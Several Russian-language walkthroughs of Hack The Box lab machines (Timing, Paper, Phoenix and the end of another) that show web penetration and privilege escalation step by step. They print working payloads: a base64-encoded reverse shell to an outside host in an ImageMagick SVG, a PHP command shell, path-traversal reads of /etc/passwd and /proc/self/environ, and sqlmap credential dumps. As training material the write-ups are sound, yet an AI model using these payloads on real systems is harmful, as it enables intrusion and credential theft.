Первым делом откроем еще один листенер (rlwrap -cAr nc -lvp 5432)
и закодируем реверс‑шелл, что позволит выполнить его в конвейере:


echo '/bin/sh -i >& /dev/tcp/10.10.14.47/5432 0>&1'





                           Кодирование нагрузки

Теперь используем следующий шаблон для эксплуатации уязвимости. Коман‐
да должна быть вставлена в параметр authenticate тега image, а название
самого файла — в параметр xlink:href тега image. Файл expl.svg копиру‐
ем в каталог /var/www/dev01.artcorp.htb/convert_images/ и ожидаем
подключения.


<image authenticate='ff" `echo $(echo
L2Jpbi9zaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC40Ny81NDMyIDA+JjEK |
base64 -d | /bin/bash )> /dev/shm/0wned`;"'>
 <read filename="pdf:/etc/passwd"/>
 <get width="base-width" height="base-height" />
 <resize geometry="400x400" />
 <write filename="test.png" />
 <svg width="700" height="700" xmlns="http://www.w3.org/2000/svg"
xmlns:xlink="http://www.w3.org/1999/xlink">
 <image xlink:href="msl:expl.svg" height="100" width="100"/>
 </svg>
</image>





                        Приватный ключ пользователя

После бэкконнекта получим приватный ключ пользователя и подключимся
по SSH.





                       Флаг пользователя


ЛОКАЛЬНОЕ ПОВЫШЕНИЕ ПРИВИЛЕГИЙ
Базовую разведку на хосте мы уже проводили и такие вещи, как приложения
с выставленным битом SUID, прослушиваемые для локального хоста порты
и запускаемые приложения, просматривали. Осталась только одна вещь,
которая может измениться вместе с изменением рабочего контекста, — нас‐
тройки sudoers.


sudo -l




                              Настройки судоера

Мы можем без ввода пароля выполнить команду /usr/bin/neofetch  ""
от имени пользователя root. Neofetch — это очень простая в использовании
и кросс‑платформенная утилита, которая позволяет отображать информацию
о системе в терминале.





                         Запуск приложения neofetch

Первым делом я решил поискать его в базе GTFOBins — это список дво‐
ичных файлов Unix, которые можно использовать для обхода локальных огра‐
ничений безопасности в неправильно настроенных системах. Там и находим
способ эксплуатации приложения под судоером.





                     Техника эксплуатации sudo neofetch

Смысл техники в том, чтобы записать команду терминала в конфиг, который
нужно передать neofetch. Но в нашем случае судоер выполнит жестко указан‐
ную команду. Тогда попробуем найти конфиг по умолчанию $HOME/.config/
neofetch/config.conf и записать команду в него.





                      Содержимое файла config.conf

Теперь указываем переменную среды XDG_CONFIG_HOME, чтобы путь к кон‐
фигу существовал в контексте судоера.


export XDG_CONFIG_HOME="$HOME/.config"

Теперь при выполнении приложения выполнится и наша команда, и мы
получим командную оболочку в высокопривилегированном контексте.





                           Флаг рута

Флаг рута — в наших руках, машина захвачена!
ВЗЛОМ

      HTB
 TIMING





    ПЕНТЕСТИМ ВЕБ-СЕРВЕР НА PHP





Сегодня  мы  с  тобой  пройдем  путь
от базового сканирования сайта до эксплу‐
атации уязвимости типа LFI и загрузки шел‐
ла. Для захвата рута нам понадобится найти
уязвимость   в   приложении   на   Java.             RalfHacker                                                                                             hackerralf8@gmail.com
А  упражняться мы  будем  на  средней
по сложности машине Timing с площадки
Hack The Box.


           WARNING

                            Подключаться к машинам с HTB рекомендуется
                            только через VPN. Не делай этого с компьютеров,
                        где есть важные для тебя данные, так как ты ока‐
                        жешься в общей сети с другими участниками.



РАЗВЕДКА
Сканирование портов
Добавляем IP-адрес машины в /etc/hosts:


10.10.11.135    timing.htb

И запускаем сканирование портов.

Справка: сканирование портов
Сканирование портов — стандартный первый шаг при любой атаке. Он поз‐
воляет атакующему узнать, какие службы на хосте принимают соединение.
На основе этой информации выбирается следующий шаг к получению точки
входа.
   Наиболее известный инструмент для сканирования — это Nmap. Улучшить
результаты его работы ты можешь при помощи следующего скрипта.


 #!/bin/bash
 ports=$( nmap -p- --min-rate= 500 $1 | grep ^[0-9] | cut -d '/' -f 1 |
 tr '\n' ',' | sed s/,$/ /)
 nmap -p$ports -A $1


Он действует в два этапа. На первом производится обычное быстрое ска‐
нирование, на втором — более тщательное сканирование, с использованием
имеющихся скриптов (опция -A).





                             Результат работы скрипта

Нашли два открытых порта:
 • 22 — служба OpenSSH 7.6p1;
 • 80 — веб‑сервер Apache 2.4.29.

На SSH нам ловить нечего, пропускаем его.

Справка: брутфорс учеток
Поскольку вначале у нас нет учетных данных, нет и смысла изучать службы,
которые всегда требуют авторизации (например, SSH). Единственное, что мы
можем делать здесь, — это перебирать пароли брутфорсом, но машины
с HTB почти всегда можно пройти по‑другому. В жизни таких вариантов
может не быть, к тому же есть шансы подобрать пароль или получить его
при помощи социальной инженерии.



Посмотрим, что нам покажет веб‑сервер. При обращении к нему происходит
редирект на страницу /login.php, где нас встречает форма авторизации.





                         Форма авторизации

Понятно, что сайт не одностраничный, поэтому попробуем найти скрытые
страницы. Так как первая страница была в формате PHP, остальные будем
перебирать с таким же расширением. Я для этого воспользуюсь сканером
ffuf.


Справка: сканирование веба c ffuf
Одно из первых действий при тестировании безопасности веб‑приложе‐
ния — это сканирование методом перебора каталогов, чтобы найти скрытую
информацию и недоступные обычным посетителям функции. Для этого можно
использовать программы вроде dirsearch и DIRB.
  Я предпочитаю легкий и очень быстрый ffuf. При запуске указываем сле‐
дующие параметры:
 • -w — словарь (я использую словари из набора SecLists);
 • -t — количество потоков;
 • -u — URL;
 • -fc — исключить из результата ответы с кодом 403.



Запускаем его с нужными параметрами:


ffuf -u http://timing.htb/FUZZ -t 256 -w php_files_common.txt





                       Результат сканирования файлов PHP

Нашли много файлов, теперь просканируем и скрытые каталоги.


ffuf -u http://timing.htb/FUZZ -t 256 -w directory_2.3_medium_
lowercase.txt





                    Результат сканирования скрытых каталогов

В итоге находим каталоги для хранения скриптов и изображений. Больше нам
ничего не доступно. Сканирование файлов бэкапов и поддоменов ничего
не дало. Но мы еще не поискали параметры! Для сканирования логично выб‐
рать страницу image.php, которая предположительно должна возвращать
изображения. Так как мы не знаем, что будет передано в качестве значения
параметра,  попробуем  передать само  название  страницы  в  надежде
получить какую‑нибудь ошибку.


ffuf -u 'http://timing.htb/image.php?FUZZ=../image.php' -t 256 -w
parameters.txt -fs 0




                        Результат сканирования параметра

Мы нашли один параметр — img. То есть мы можем запросить файл с кар‐
тинкой по его названию. Попробуем таким способом утащить какой‑нибудь
системный файл, задав относительный путь.




                     Сообщение, что обнаружена атака

Нас поймали за руку!


ТОЧКА ВХОДА
Здесь, судя по всему, используются какие‑то фильтры, которые мешают нам
читать любой файл. Я попробовал разные варианты оберток для параметра
и обнаружил, что срабатывает запрос вот такого вида:


/image.php?img=php://filter/convert.base64-encode/resource=index.php

Справка: LFI в PHP
Local file inclusion (LFI) — техника, которая используется для получения дос‐
тупа к файлам в системе через веб‑сервер. Чтобы сервер отобразил файл,
а не попытался его выполнить, ему нужно передать «обертку» — команды,
которые закодируют файл. После его получения останется лишь раскодиро‐
вать его обратно.  Существует множество  готовых оберток, которые ты
можешь применять при пентесте.



Содержимое  этой  страницы,  полученной  в  ответ,  будет  закодировано
в Base64. Декодировать можно прямо в Burp, нажав Ctrl-Shift-B.





                      Получение кода страницы index.php

Так как мы можем получить код любой страницы, идем по порядку и заг‐
лядываем в исходный код страницы login.php.





                         Исходный код login.php

В нем ничего интересного нет, кроме подключения файла db_conn.php
(строка 10). Конечно же, просмотрим и его. Здесь мы находим учетку для под‐
ключения к базе данных.




                       Исходный код db_conn.php

Пароль пока ни к чему не подошел, поэтому копаем дальше. Перейдем к фай‐
лам, о которых мы уже знаем. Начнем с upload.php.





                        Исходный код upload.php

В самом начале подключается файл admin_auth_check.php. Затем задаются
необходимые параметры для загруженного файла, в том числе и file_name.
Имя  файла   создается  по  следующему   алгоритму:  берется  строка
'$file_hash', затем добавляется текущее время (результат выполнения
функции time()), все это конвертируется в хеш MD5, а дальше добавляется
знак нижнего подчеркивания и имя файла, которое использовалось при заг‐
рузке.  При  этом  файл  должен  иметь  расширение  jpg.  А  в  файле
admin_auth_check.php только сравнивается роль пользователя.
   Если бы $file_hash кто‑то по ошибке не обернул в кавычки, то подста‐
вилось бы значение переменной, полученное от PHP-функции uniqid(). Раз‐
гадать уникальный идентификатор у нас бы не вышло, а без него единствен‐
ной преградой будет вывод функции time().





                   Исходный код admin_auth_check.php

Впрочем, пока что здесь больше ничего не сделать, и придется брутить фор‐
му авторизации. Для начала найдем имена пользователей, к примеру в файле
/etc/passwd.




                     Содержимое файла /etc/passwd

Но при подборе пароля сразу попробуем использовать имя пользователя
в качестве пароля, и это дает нам доступ.





                   Панель авторизованного пользователя

Нам открывается новая функция — изменение профиля.





                      Форма изменения профиля

При отправке данных формы выясним, куда они шлются, а потом получим код
этой страницы, чтобы просмотреть, как обрабатываются данные.





                         История запросов в Burp





                        Исходный код update.php




                                     Продолжение статьи →
                                   ← НАЧАЛО СТАТЬИВЗЛОМ
         HTB TIMING
                  ПЕНТЕСТИМ ВЕБ-СЕРВЕР НА PHP




Видим, что в обработчике на один параметр больше, чем отправляется через
форму. Значит, мы можем добавить role и задать любую роль. Это должно
дать нам привилегированный контекст.





                              Новый запрос





                                 Ответ сервера

В итоге мы получаем ответ со всеми перечисленными параметрами, а на
самой странице появляется ссылка на панель администратора.





                      Главная страница администратора


ТОЧКА ОПОРЫ
С панели администратора нам открывается функция загрузки аватара.





                        Форма загрузки файла

Мы знаем, что это должен быть файл с расширением jpg. Но вот только его
содержимое не проверяется, поэтому мы можем записать туда код на PHP
и затем попробовать выполнить. Запишем следующий простой PHP-шелл,
выполняющий принятую команду, и загрузим файл на сервер.


echo '<?php echo system($_GET["cmd"]);?>' > test.jpg





                      Сообщение о загрузке файла

Файл успешно загружен, теперь определимся с именем, под которым он сох‐
ранился на сервере. Для этого вспомним принцип, по которому он формиру‐
ется.



            Код формирования имени загруженного файла

Единственная переменная, которую нам осталось получить, — значение фун‐
кции time(). Эта  функция  возвращает  количество  секунд,  прошедших
с 00:00:00 01.01.1970. И если мы знаем время загрузки файла, установ‐
ленное на сервере, мы сможем получить это значение. Так как вся работа
выполняется через Burp, в истории запросов найдем HTTP-заголовок ответа
сервера. В заголовке Date будет указано нужное нам время.





            HTTP-заголовок ответа сервера при загрузке файла

Теперь мы можем получить значение MD5 от сложения всех строк:


echo md5('$file_hash' . strtotime("Wed, 05 Jan 2022 13:19:51 GMT"));





                       Расчет первой части имени файла

Нам нужно обращаться к файлу вот с таким именем:


e3879d6c6425db4ad6e139681d11693d_test.jpg

Попробуем с помощью нашего хеша выполнить базовую команду id.


curl 'http://timing.htb/image.php?img=images/uploads/
e3879d6c6425db4ad6e139681d11693d_test.jpg&cmd=id'




                          Выполнение команды id

Команда успешно выполнена, что означает получение доступа к хосту.


ПРОДВИЖЕНИЕ
Для дальнейшего продвижения нам необходимо найти учетные данные.
Для этого предстоит изучить файлы в каталоге веб‑сервера, всевозможные
резервные копии и другие пользовательские файлы. Так находим бэкапы
исходников в каталоге /opt.




                        Содержимое каталога /opt

Копируем архив в каталог веб‑сервера и легко скачиваем через браузер.


curl 'http://timing.htb/image.php?img=images/uploads/
e3879d6c6425db4ad6e139681d11693d_test.jpg&cmd=cp+/opt/
source-files-backup.zip+./'





                  Скачивание исходных кодов через браузер

В архиве присутствует каталог с расширением git. Это позволит нам получить
доступ к истории изменений файлов.





                          Содержимое архива

Для удобной работы с репозиториями Git можно использовать графический
просмотрщик gitk. Он помог найти изменение пароля для подключения к базе
данных.





                    Изменение в файле db_conn.php

А вот уже с этим паролем удается подключиться по SSH и забрать первый
флаг.



                       Флаг пользователя


ЛОКАЛЬНОЕ ПОВЫШЕНИЕ ПРИВИЛЕГИЙ
Первым делом проверяем наиболее вероятные места повышения привиле‐
гий: настройки sudoers, приложения с выставленным битом SUID, прос‐
лушиваемые на локалхосте порты. Проверим sudoers командой sudo -l.




                              Настройки судоера

В  настройках  прописан  привилегированный  запуск /usr/bin/netutils
без ввода пароля (NOPASSWD). Просмотрим тип файла.


                  Определение типа файла /usr/bin/netutils

Это обычный скрипт. Давай глянем на его содержимое.



                    Содержимое файла /usr/bin/netutils

Это пользовательское приложение на Java. Но так как оно расположено
в каталоге рута, мы не можем получить доступ к самому файлу и деком‐
пилировать его, чтобы изучить. Тогда давай хотя бы запустим программу
и посмотрим, как она работает.




                          Меню приложения

Нам предлагают выбрать одну из опций: FTP или HTTP. После чего с указан‐
ного ресурса загружается файл.





                      Сообщение о загрузке файла

Посмотрим, что происходит с процессами в системе при выполнении этого
приложения. Для отслеживания процессов будем использовать pspy64. Заг‐
рузим его на хост:


scp ./pspy64 aaron@timing.htb:/tmp/

И выполним. В выводе видим запуск скрипта, но, что более интересно, после
указания адреса для загрузки используется программа axel в контексте
пользователя с UID=0, а это пользователь root.





                                    Логи pspy

Я сразу попробовал выполнить инъекцию команды ОС, но это ничего не дало.



                     Тестирование OS Command Injection

Однако мы можем конфигурировать axel и управлять некоторыми его
параметрами, к примеру именем файла и каталогом для его сохранения.
Недолго размышляя, пробуем сохранить файл как публичный SSH-ключ поль‐
зователя root. Для этого в домашнем каталоге текущего пользователя сох‐
раним файл .axelrc со следующим содержимым:


default_filename = /root/.ssh/authorized_keys



                    Файл конфигураций axel

На локальном хосте сгенерируем пару ключей (ssh-keygen) и переименуем
публичный, чтобы он назывался index.html. Запустим простой веб‑сервер
на Python:


python3 -m http.server 80

А затем обратимся к нему из тестируемого приложения.





                             Запись SSH-ключа

Видим сообщение с именем сохраненного файла, пробуем подключиться
с закрытым ключом и получаем контроль над хостом.



                           Флаг рута

Машина захвачена, и у нас есть флаг рута.
ВЗЛОМ

       HTB
 PAPER





       ПЕНТЕСТИМ WORDPRESS
    И ЭКСПЛУАТИРУЕМ БАГ В POLKIT





В сегодняшнем райтапе мы проэксплуати‐
руем   уязвимости  в  популярной  CMS
WordPress,  корпоративном  мессенджере
RocketChat,  а   также  разберем  одну
из самых нашумевших уязвимостей — Polkit             RalfHacker                                                                                             hackerralf8@gmail.com
LPE. Все это в рамках легкой машины Paper
с площадки Hack The Box.


           WARNING

                            Подключаться к машинам с HTB рекомендуется
                            только через VPN. Не делай этого с компьютеров,
                        где есть важные для тебя данные, так как ты ока‐
                        жешься в общей сети с другими участниками.



РАЗВЕДКА
Сканирование портов
Добавляем IP-адрес машины в /etc/hosts:


10 .10 .11 .143    paper .htb

И запускаем сканирование портов.


Справка: сканирование портов
Сканирование портов — стандартный первый шаг при любой атаке. Он поз‐
воляет атакующему узнать, какие службы на хосте принимают соединение.
На основе этой информации выбирается следующий шаг к получению точки
входа.
   Наиболее известный инструмент для сканирования — это Nmap. Улучшить
результаты его работы ты можешь при помощи следующего скрипта.


 #!/bin/bash
 ports=$( nmap -p- --min-rate= 500 $1 | grep ^[0-9] | cut -d '/' -f 1 |
 tr '\n' ',' | sed s/,$/ /)
 nmap -p$ports -A $1


Он действует в два этапа. На первом производится обычное быстрое ска‐
нирование, на втором — более тщательное сканирование, с использованием
имеющихся скриптов (опция -A).





                             Результат работы скрипта

Скрипт нашел три открытых порта: 22 — служба OpenSSH 8.0, 80 и 443 —
веб‑сервер Apache 2.4.37. Обычно в SSL-сертификате можно подсмотреть
новые доменные имена в поле commonName, но не в этот раз.





                           Главная страница сайта


ТОЧКА ВХОДА
При пентесте веб‑сервисов лучше всего работать в Burp. Полезно, к при‐
меру, что в Burp History можно будет просмотреть всю цепочку пользователь‐
ских запросов и ответов сервера. Так, в HTTP-заголовке X-Backend-Server
находим еще один домен — office.paper.





                         Запросы в Burp History

Тоже добавляем его в /etc/hosts.


10 .10 .11 .143 paper .htb office.paper

И на этом домене находим новый сайт.





                        Главная страница office.paper

И снова Burp History нам помогает — по страницам, к которым обращается
наш клиент, мы определяем, что на машине установлен WordPress.





                         Запросы в Burp History


ТОЧКА ОПОРЫ
WordPress
На сайте несколько статей с комментариями, которые мы можем прочитать.
И один из комментирующих указывает, что в черновиках лежат какие‑то сек‐
ретные данные.





                           Комментарий с сайта

Поскольку мы столкнулись с WordPress, можем воспользоваться специаль‐
ными утилитами для работы с ней. В первую очередь нам понадобится
WPScan — сканер, который автоматически ищет уязвимости в WordPress
и установленных плагинах.
   Передадим сканеру следующие параметры:
 • --url — URL;
 • -e ap — поиск установленных плагинов;
 • --plugins-detection — способ определения плагина. Aggressive —
   грубое сканирование перебором;
 • -t — количество потоков;
 • --api-token — полученный с официального сайта API-ключ.


wpscan --url http://office.paper -e ap --plugins-detection
aggressive -t 256 --api-token [...KEY...]





                   Обнаруженные уязвимости WordPress

И мы находим уязвимость, которая  позволяет читать  приватные  посты.
По предоставленной утилитой ссылке мы получим инструкцию, как эксплуати‐
ровать уязвимость.





                  Описание обнаруженной уязвимости

Переходим к странице /?static=1, и нам становится доступным скрытый
пост.





                       Содержимое скрытого поста

Находим ссылку на еще один домен. Добавим его в /etc/hosts и прос‐
мотрим в браузере.


10 .10 .11 .143 paper .htb office.paper chat .office.paper





                      Панель регистрации Rocket.Chat

Так мы получаем доступ к панели регистрации в Rocket.Chat!


Rocket.Chat
Rocket.Chat — это полностью настраиваемый мессенджер на JavaScript c
открытым исходным кодом. Так как мы получили доступ к странице регистра‐
ции, то создадим себе аккаунт и авторизуемся.





                         Главная панель Rocket.Chat

Но мы получаем пустой мессенджер, поэтому идея узнать приватные данные
из переписок сразу отпала. Однако спустя минуту приходит сообщение
от бота!





                   Входящие сообщения Rocket.Chat

В рассказе о себе и своих функциях бот упоминает возможность прочитать
файл из хранилища.





                            Возможности бота

Пытаемся получить вымышленный файл, и бот выдает нам полный путь
к предполагаемому файлу. И это обычный системный каталог.


recyclops file test.txt





                        Ошибка чтения файла

Так как бот просто пытается прочитать файл на диске, мы можем попробовать
проэксплуатировать уязвимость обхода каталога и прочитать любой другой
файл на сервере, к примеру /etc/passwd.


recyclops file ../../../../../../etc/passwd





                     Содержимое файла /etc/passwd

И мы получаем содержимое указанного файла! В подобных случаях мы уже
должны знать, какие файлы в системе наиболее интересны. Первым делом я
попытался прочитать приватный ключ SSH пользователя dwight.


recyclops file ../../../../../../home/dwight/.ssh/id_rsa





                        Ошибка чтения файлов

Такого файла в системе нет, но зато нам повезло с файлом, содержащим
переменные среды выполнения (окружения) процесса.


recyclops file ../../../../../../proc/self/environ





                   Содержимое файла /proc/self/environ

Среди переменных окружения есть логин и пароль, который также подходит
для службы SSH. Логинимся и забираем флаг пользователя.





                       Флаг пользователя


ЛОКАЛЬНОЕ ПОВЫШЕНИЕ ПРИВИЛЕГИЙ
Пути для дальнейшего продвижения поищем при помощи PEASS.


Справка: скрипты PEASS для Linux (загрузка через SCP)
Что делать после того, как мы получили доступ в систему от имени поль‐
зователя? Вариантов дальнейшей эксплуатации и повышения привилегий
может быть очень много, как в Linux, так и в Windows. Чтобы собрать
информацию и наметить цели, можно  использовать  Privilege  Escalation
Awesome Scripts SUITE (PEASS) — набор скриптов, которые проверяют сис‐
тему на автомате.


Загружаем на хост это чудесное средство и выполняем. И сразу же нам сооб‐
щают об автоматически найденной уязвимости CVE-2021-3560.





                             Вывод LinPEAS

Эксплоитов на GitHub много, для их поиска достаточно просто указать номер
CVE.





                         Поиск эксплоитов в Google

Для понимания уязвимости нужно знать, что такое Polkit. Polkit (PolicyKit) —
библиотека для UNIX-подобных операционных систем, позволяет предос‐
тавить непривилегированным процессам возможность выполнять привиле‐
гированные операции. Polkit можно использовать вместо sudo, но в отличие
от sudo Polkit не наделяет процесс пользователя повышенными правами,
а позволяет точно контролировать, что разрешено, а что запрещено. Эта
библиотека используется утилитой systemd, а значит, и установлена по умол‐
чанию во многих дистрибутивах Linux.
   Суть уязвимости в том, что Polkit можно заставить обходить проверки учет‐
ных данных для запросов D-Bus, повышая привилегии до пользователя root.
Эту уязвимость можно эксплуатировать от имени локального пользователя,
например  создать нового  привилегированного  пользователя. Но  чтобы
понять архитектуру уязвимости, нужно разобрать связь между Polkit и D-Bus.


Как работает Polkit
Как создается новый пользователь через Polkit, изображено на схеме ниже.
Два процесса над пунктирной линией работают в непривилегированном
режиме.





                   Схема взаимодействия D-Bus и Polkit

 1. Процесс dbus-send дает сигнал о создании нового пользователя про‐
   цессу accounts-daemon.
 2. Процесс accounts-daemon  получает  сигнал  через  dbus-daemon.
  При этом dbus-daemon прикрепит к сигналу имя шины.
 3. В свою очередь, account-daemon запрашивает у polkit, разрешено ли
   соединение c данной шиной для создания нового пользователя.
 4. Для определения polkit запрашивает у dbus-daemon UID для коннекта.
 5. Если UID равен 0 (root), polkit авторизует запрос. Иначе polkit отправ‐
   ляет агенту аутентификации список пользователей, которым разрешено
   авторизовать запрос.
 6. Агент аутентификации отобразит пользователю диалоговое окно для вво‐
   да пароля, который потом отправит polkit.
 7. Если polkit все же  авторизует  этот  запрос, он  отправит  сигнал
   к accounts-daemon, а тот уже создаст нового пользователя.


Уязвимость в схеме работы Polkit
Уязвимость находится на четвертом этапе последовательности. Когда Polkit
запрашивает у dbus-daemon UID коннекта, а этого коннекта больше не сущес‐
твует, dbus-daemon правильно обрабатывает эту ситуацию и возвращает
ошибку. Но оказалось, что Polkit неправильно ее обрабатывает! Вместо того
чтобы отклонить запрос, Polkit поступает так, как если бы он исходил от про‐
цесса с UID, равным 0, то есть немедленно авторизует.


Эксплуатация уязвимости Polkit
Таким образом, нам нужно запустить dbus-send и уничтожить его, пока Polkit
все еще обрабатывает запрос. Но оказалось, что Polkit запрашивает у dbus-
daemon UID процесса несколько раз по разным путям. Большинство из этих
путей правильно обрабатывают ошибку, но один из них — нет! Если убить
dbus-send досрочно, то команда будет обработана одним из «правильных»
путей и запрос будет отклонен. Чтобы активировать уязвимый путь, надо
завершить процесс в нужный момент. Поэтому последовательность действий
требуется выполнить несколько раз.
  Все это уже реализовано в коде эксплоита. Нужно лишь запустить файл
и дождаться привилегированного контекста.
  Мы получаем привилегии рута и забираем флаг.





                           Флаг рута

Машина захвачена!
ВЗЛОМ

       HTB
 PHOENIX





     ЛОМАЕМ САЙТ НА WORDPRESS
           В ОБХОД WAF





В сегодняшнем райтапе мы с тобой снова
попентестим WordPress. Проэксплуатируем
SQL-инъекцию и узнаем учетные данные,
потом получим доступ к хосту через уяз‐
вимость  загрузки  файлов,  а  усложнено             RalfHacker                                                                                             hackerralf8@gmail.com
это все будет работающим Web Application
Firewall. Продвинемся и повысим привиле‐
гии,  сделав  туннель для проброса SSH
и выполнив инъекцию в команду rsync.
Все это — чтобы пройти сложную машину
Phoenix с площадки Hack The Box.


           WARNING

                            Подключаться к машинам с HTB рекомендуется
                            только через VPN. Не делай этого с компьютеров,
                        где есть важные для тебя данные, так как ты ока‐
                        жешься в общей сети с другими участниками.



РАЗВЕДКА
Добавляем IP виртуалки в /etc/hosts:


10.10.11.149    phoenix.htb

И запускаем сканирование портов.

Справка: сканирование портов
Сканирование портов — стандартный первый шаг при любой атаке. Он поз‐
воляет атакующему узнать, какие службы на хосте принимают соединение.
На основе этой информации выбирается следующий шаг к получению точки
входа.
   Наиболее известный инструмент для сканирования — это Nmap. Улучшить
результаты его работы ты можешь при помощи следующего скрипта.


 #!/bin/bash
 ports=$( nmap -p- --min-rate= 500 $1 | grep ^[0-9] | cut -d '/' -f 1 |
 tr '\n' ',' | sed s/,$/ /)
 nmap -p$ports -A $1


Он действует в два этапа. На первом производится обычное быстрое ска‐
нирование, на втором — более тщательное сканирование, с использованием
имеющихся скриптов (опция -A).





                             Результат работы скрипта

Нашли три открытых порта: 22 — служба OpenSSH 8.2p1, 80 и 443 — веб‑сер‐
вер Apache. Nmap отобразил для нас поле commonName из сертификата
на 443-м порте, но указанный там домен нам уже известен.





                     Главная страница сайта phoenix.htb

Захожу на сайт, и плагин Wappalyzer тут же сообщает, что используется
WordPress. Поэтому сразу запустим сканер WPScan с полным перебором
(параметр --plugins-detection) установленных плагинов (параметр -e ap)
в 256 потоков (параметр -t). Для автоматического определения уязвимостей
можно получить на сайте API-токен и указать его приложению (это бесплат‐
но). И чтобы нам не вернули ошибку проверки сертификата, отказываемся
от самой проверки (--disable-tls-checks).


wpscan --url https://phoenix.htb/ -e ap --plugins-detection
aggressive -t 256 --api-token
KEDNckD8h7Ahn3WzqoSaxy1xa6RuLmx0nCl97cO83Dw --disable-tls-checks





                             Результат работы WPScan

Но WPScan, что удивительно, ничего не нашел. А вот сайт стал выдавать нам
код 403 вместо ответов.





                                  Ответ сайта

Это явный признак того, что тут работает Web Application Firewall (WAF).


ТОЧКА ВХОДА
Давай снова запустим WPScan — без агрессивного сканирования. По умол‐
чанию он переберет самые популярные плагины.


wpscan --url https://phoenix.htb/ --api-token
KEDNckD8h7Ahn3WzqoSaxy1xa6RuLmx0nCl97cO83Dw --disable-tls-checks





                         Результат сканирования WPScan

Мы нашли несколько уязвимостей в плагине Asgaros Forum.
  И еще обязательно просканируем каталоги. Так как каталоги в списке
отсортированы по популярности и используется популярная CMS, то, скорее
всего, самые важные каталоги мы найдем еще до блокировки. Для сканиро‐
вания используем легкий, но очень быстрый ffuf.


ffuf -u https://phoenix.htb/FUZZ -t 256 -w directory_2.3_medium_
lowercase.txt





                        Результат сканирования каталогов

Присутствует каталог /forum — видимо, это то, что мы искали.





                             Страница forum

WPScan не только сканирует и определяет уязвимость, но и предоставляет
инструкцию по ее эксплуатации. Из уязвимостей наиболее привлекательна
SQL-инъекция без авторизации.





                      Детали уязвимости Asgaros Forum

Для подтверждения уязвимости нужно сделать всего один запрос. Обра‐
щаемся к странице forum через Burp Repeater и добавляем параметр


?subscribe_topic=1%20union%20select%201%20and%20sleep(10)

Если уязвимость сработает, то сервер будет отвечать больше 10 с. Это под‐
тверждает Repeater.





                  Время ответа сервера в Burp Repeater

Уязвимость подтверждена, переходим к эксплуатации.


                                     Продолжение статьи →
                                   ← НАЧАЛО СТАТЬИВЗЛОМ
        HTB PHOENIX
         ЛОМАЕМ САЙТ НА WORDPRESS В ОБХОД WAF





ТОЧКА ОПОРЫ
Получение учетных данных WordPress
Это time-based «слепая» инъекция, то есть мы не получаем данные из таб‐
лицы в явном виде, а делаем вывод на основании выполнения определенного
условия — в данном случае времени обработки запроса. Когда встречаешься
с инъекциями такого типа, удобнее всего пользоваться автоматизированным
средством эксплуатации. Нас в этом случае выручит sqlmap.
   После первого запуска sqlmap подтвердил наличие уязвимости и сфор‐
мировал нагрузку. Мы можем сузить круг поиска уязвимого параметра, задав
опцию -p. Также выставим самый тяжелый уровень нагрузок опцией --risk,
ну и если у sqlmap будут к нам вопросы, пусть выбирает самый приоритетный
(опция --batch).


sqlmap --url 'https://phoenix.htb/forum/?subscribe_topic=1' -p
subscribe_topic --risk 3 --batch





                          Результат сканирования sqlmap

После того как нагрузка составлена, получим имена и хеши паролей поль‐
зователей. В WordPress все всегда стандартно: таблица wp_users, столбцы
user_login и user_pass.
   Задаем sqlmap новые параметры: база (-D), таблица (-T), названия стол‐
бцов (-C) и команда --dump для получения данных.


sqlmap --url 'https://phoenix.htb/forum/?subscribe_topic=1' -p
subscribe_topic --risk 3 -D wordpress -T wp_users --dump --batch





                     Получение данных с помощью sqlmap

У нас есть хеши — ломаем их! Но сначала узнаем режим hashcat, распарсив
справку.


hashcat --example | grep -A2 -B2 '\$P\$'





                             Справка hashcat

Полученный режим указываем в параметре -m. У меня ушло около часа
для полного перебора, но получаем три пароля.


hashcat -m 400 -a 0 hashes.txt rockyou.txt





                  Результат перебора хешей с помощью hashcat

Никакие из полученных учетных данных не подходят к SSH, а WordPress вооб‐
ще использует двухфакторную аутентификацию.





          Форма проверки OTP при аутентификации в WordPress


Получение активных плагинов WordPress
Здесь я долго думал, что делать дальше, но в итоге вспомнил, что прос‐
мотреть все плагины нам помешал WAF. Зато теперь‑то мы можем узнать их
названия, прочитав столбец option_value таблицы wp_options. Составим
запрос так, чтобы в вывод попали только активные плагины.


sqlmap --url 'https://phoenix.htb/forum/?subscribe_topic=1' -p
subscribe_topic --risk 3 -D wordpress -T wp_options -C option_value
--where "option_name='active_plugins'" --dump --batch





                         Список активных плагинов

В списке присутствует уязвимый плагин Download from files, для которого есть
эксплоит, позволяющий загружать на сервер файлы.





                 Описание уязвимости Download from files

С помощью этого эксплоита мы загрузим на сервер популярный реверс‑шелл
на PHP. В этой нагрузке нужно указать адрес и порт своего хоста для подклю‐
чения. Не забываем запустить листенер:


rlwrap -cAr nc -lvp 4321





                      Измененный код реверс‑шелла

Но при эксплуатации уязвимости получим сообщение с ошибкой проверки
сертификата.


python3 50287.py https://phoenix.htb shell.phtml




                   Ошибка при выполнении эксплоита

В каждый запрос в исходниках эксплоита добавим опцию verify=False,
которая должна отключить проверку SSL-сертификата.





                      Изменение кода эксплоита





                      Изменение кода эксплоита

Теперь повторно выполняем эксплоит и получаем сообщение, что файл
успешно загружен.


python3 50287.py https://phoenix.htb shell.phtml





                      Сообщение о загрузке файла

Нам осталось обратиться по указанной ссылке, и мы получим бэкконнект
на свой листенер.


curl -k https://phoenix.htb/wp-admin/shell.phtml





                         Получение удаленной сессии

Мы получили доступ к системе.


ПРОДВИЖЕНИЕ
Так как на хосте развернут веб‑сервер, а на нем работает целая CMS, первое
наше действие — попробовать получить какие‑нибудь учетные данные поль‐
зователей. Высока вероятность, что эти учетки подойдут и для локальных
пользователей тоже. В случае с WordPress есть место, где учетные данные
найдутся всегда, — файл с настройками для подключения к базе данных wp-
config.php. Найдем этот файл и просмотрим его содержимое.


find ./ -name wp-config.php 2>/dev/null




                         Поиск файла wp-config.php





                    Содержимое файла wp-config.php

Получаем еще один пароль. Теперь узнаем активных пользователей из файла
/etc/passwd и проверим, не подойдет ли для доступа по SSH какая‑нибудь
комбинация из полученных нами логинов и паролей.





                     Содержимое файла /etc/passwd

Нам нужен пользователь  editor, но  авторизоваться от его имени никак
не получалось. Это было очень подозрительно, поэтому я решил просмотреть
возможные  настройки  авторизации.  Разгадка  нашлась  в  файле /etc/
security/access-local.conf. Он содержит правила, определяющие, каким
пользователям и с каких адресов разрешен вход.





                   Содержимое файла access-local.conf

Стоит запрет авторизации для всех адресов, кроме 10.11.12.13. А это наш
второй адрес!





